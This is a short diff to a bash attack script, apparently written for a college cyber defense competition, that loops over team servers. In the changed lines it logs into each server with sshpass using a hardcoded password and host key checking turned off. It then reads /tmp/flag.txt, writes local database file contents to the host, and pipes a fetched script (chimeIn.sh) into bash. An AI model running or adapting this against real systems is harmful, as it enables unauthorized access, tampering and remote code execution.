@@ -14,9 +14,9 @@ echo "Yomato Cannon online"
 sleep 1
 tput sgr0
 
-for i in {1,2}; do
+for i in {1..2}; do
 sshpass -p 'chris' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" chris@www.team$i.isucdc.com tput -T xterm-256color setaf 46\; echo SUCCESS ON TEAM $i \; tput -T xterm-256color setaf 190\; cat /tmp/flag.txt \; tput -T xterm-256color sgr0 \; echo `cat team$i/*db*` \> /tmp/flag.flag\; curl http://127.0.0.1/chimeIn.sh \| bash &
-sleep 2
+sleep 1
 done
 
 
